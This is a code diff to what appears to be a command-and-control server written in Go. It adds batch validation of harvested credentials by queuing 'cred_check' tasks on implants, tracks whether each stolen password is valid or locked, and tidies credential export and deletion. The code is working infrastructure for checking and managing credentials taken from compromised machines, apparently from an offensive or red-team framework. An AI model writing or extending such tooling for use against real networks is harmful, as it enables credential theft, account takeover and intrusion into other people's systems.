@@ -529,10 +529,13 @@ func (s *Server) parseAndStoreCredCheckResult(agentID string, task db.Task, raw 
 			entry := *matched
 			entry.Confirmed = true
 			entry.TaskID = task.ID
+			now := time.Now()
 			if err := s.db.Model(&entry).Updates(map[string]interface{}{
-				"confirmed": true,
-				"task_id":   task.ID,
-				"notes":     appendCredCheckNote(entry.Notes),
+				"confirmed":        true,
+				"task_id":          task.ID,
+				"notes":            appendCredCheckNote(entry.Notes),
+				"verify_status":    "valid",
+				"last_verified_at": &now,
 			}).Error; err != nil {
 				slog.Error("Failed to confirm credential entry", "agent_id", agentID, "error", err)
 				return false
@@ -543,6 +546,28 @@ func (s *Server) parseAndStoreCredCheckResult(agentID string, task db.Task, raw 
 			slog.Info("Credential confirmed via cred_check", "agent_id", agentID, "user", entryUser, "domain", entryDomain)
 			s.LogAuditRecord(nil, "cred_check", "credential", agentID,
 				fmt.Sprintf("credential confirmed: %s@%s", entryUser, entryDomain), true, nil)
+		}
+	}
+
+	if status == "invalid" || status == "locked" {
+		// Lifecycle feedback: pending batch-verification entries for this user
+		// flip to invalid so operators stop chasing dead credentials.
+		rUser := strings.TrimSpace(r.User)
+		if atIdx := strings.Index(rUser, "@"); atIdx > 0 {
+			rUser = rUser[:atIdx]
+		}
+		if slashIdx := strings.Index(rUser, "\\"); slashIdx > 0 {
+			rUser = rUser[slashIdx+1:]
+		}
+		if rUser != "" {
+			now := time.Now()
+			s.db.Model(&db.CredentialEntry{}).
+				Where("agent_id = ? AND domain = ? AND username = ? AND verify_status = ?",
+					agentID, cmdDomain, rUser, "pending").
+				Updates(map[string]interface{}{
+					"verify_status":    "invalid",
+					"last_verified_at": &now,
+				})
 		}
 	}
 
@@ -862,7 +887,7 @@ func (s *Server) handleExportCredentials(c *gin.Context) {
 	s.LogAuditRecord(c, "credential_export", "credential", "", "credentials exported as CSV", true, nil)
 
 	var creds []db.CredentialEntry
-	query := s.db.Order("created_at desc").Limit(5000)
+	query := s.db.WithContext(s.ctx).Order("created_at desc").Limit(5000)
 
 	tagFilter := c.Query("tag")
 	expiryFilter := c.Query("expiry")
@@ -971,7 +996,14 @@ func (s *Server) handleDeleteCredential(c *gin.Context) {
 		respondError(c, http.StatusBadRequest, "invalid id")
 		return
 	}
-	if err := s.db.Delete(&db.CredentialEntry{}, id).Error; err != nil {
+	// Delete atomically with the usage-ledger rows: CredentialUsage has no FK
+	// cascade, so entries previously accumulated dangling references forever.
+	if err := s.db.Transaction(func(tx *gorm.DB) error {
+		if err := tx.Where("credential_id = ?", id).Delete(&db.CredentialUsage{}).Error; err != nil {
+			return err
+		}
+		return tx.Delete(&db.CredentialEntry{}, id).Error
+	}); err != nil {
 		slog.Error("Failed to delete credential", "id", id, "error", err)
 		s.LogAuditRecord(c, "credential_delete", "credential", "", "delete credential id="+idStr+" failed", false, err)
 		respondError(c, http.StatusInternalServerError, "failed to delete")
@@ -1028,6 +1060,102 @@ func (s *Server) handleUpdateCredential(c *gin.Context) {
 		"agent_id":     cred.AgentID,
 	})
 	c.JSON(http.StatusOK, gin.H{"success": true})
+}
+
+// handleBatchVerifyCredentials queues cred_check tasks for the selected vault
+// entries, grouped by harvesting agent. Each entry with a stored password gets
+// one validation task; results flow back through parseAndStoreCredCheckResult
+// which flips VerifyStatus to valid/invalid and stamps LastVerifiedAt.
+// POST /credentials/batch/verify {ids: [1,2,3]}
+func (s *Server) handleBatchVerifyCredentials(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	var req struct {
+		IDs []uint `json:"ids" binding:"required"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil || len(req.IDs) == 0 {
+		respondError(c, http.StatusBadRequest, "ids required")
+		return
+	}
+	if len(req.IDs) > 100 {
+		req.IDs = req.IDs[:100]
+	}
+
+	var entries []db.CredentialEntry
+	if err := s.db.Where("id IN ?", req.IDs).Find(&entries).Error; err != nil {
+		respondError(c, http.StatusInternalServerError, "query failed")
+		return
+	}
+
+	type verifyOutcome struct {
+		ID      uint   `json:"id"`
+		Status  string `json:"status"` // queued, skipped_no_password, skipped_hash_only, skipped_no_agent, skipped_agent_gone, skipped_fuse, error
+		TaskID  uint   `json:"task_id,omitempty"`
+		AgentID string `json:"agent_id,omitempty"`
+		Error   string `json:"error,omitempty"`
+	}
+	outcomes := make([]verifyOutcome, 0, len(entries))
+	queued := 0
+
+	for _, entry := range entries {
+		out := verifyOutcome{ID: entry.ID, AgentID: entry.AgentID}
+		switch {
+		case entry.Password == "" && entry.Hash == "":
+			out.Status = "skipped_no_password"
+			outcomes = append(outcomes, out)
+			continue
+		case entry.Password == "":
+			// NTLM hashes cannot be validated by runas-style cred_check; only
+			// cleartext passwords are verifiable by the agent handler.
+			out.Status = "skipped_hash_only"
+			outcomes = append(outcomes, out)
+			continue
+		case entry.AgentID == "":
+			out.Status = "skipped_no_agent"
+			outcomes = append(outcomes, out)
+			continue
+		}
+		var agent db.Implant
+		if err := s.db.Select("id").Where("id = ?", entry.AgentID).First(&agent).Error; err != nil {
+			out.Status = "skipped_agent_gone"
+			outcomes = append(outcomes, out)
+			continue
+		}
+		if s.credCheckFuse.tripped(entry.AgentID, entry.Domain) {
+			out.Status = "skipped_fuse"
+			outcomes = append(outcomes, out)
+			continue
+		}
+
+		cmd := entry.Username + "|" + entry.Domain + "|" + entry.Password + "|"
+		task, err := s.createTask(entry.AgentID, "cred_check", cmd, "", "", "", 0, 0, callerOpts(c)...)
+		if err != nil {
+			out.Status = "error"
+			out.Error = sanitizeError(err, "Credential operation")
+			outcomes = append(outcomes, out)
+			continue
+		}
+		now := time.Now()
+		s.db.Model(&db.CredentialEntry{}).Where("id = ?", entry.ID).Updates(map[string]interface{}{
+			"verify_status":    "pending",
+			"last_verified_at": &now,
+		})
+		out.Status = "queued"
+		out.TaskID = task.ID
+		outcomes = append(outcomes, out)
+		queued++
+
+		s.LogAuditRecord(nil, "cred_check", "credential", entry.AgentID,
+			fmt.Sprintf("batch credential check queued: %s@%s", entry.Username, entry.Domain), true, nil)
+	}
+
+	slog.Info("Batch credential verification", "requested", len(req.IDs), "queued", queued)
+	c.JSON(http.StatusOK, gin.H{
+		"success": true,
+		"queued":  queued,
+		"results": outcomes,
+	})
 }
 
 func (s *Server) handleBatchAddTags(c *gin.Context) {
